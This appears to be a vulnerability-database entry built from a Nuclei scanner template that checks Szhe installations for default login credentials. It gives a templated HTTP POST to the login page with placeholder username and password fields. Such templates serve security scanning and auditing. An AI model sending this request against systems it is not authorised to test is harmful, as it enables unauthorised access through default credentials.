# Nuclei Template: Szhe Default Login
**Template ID:** szhe-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** Medium
**CWE:** CWE-522
**Source:** Nuclei Template (`szhe-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Szhe default login information was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

email={{username}}&password={{password}}&remeber=true
```

## References
- https://github.com/Cl0udG0d/SZhe_Scan
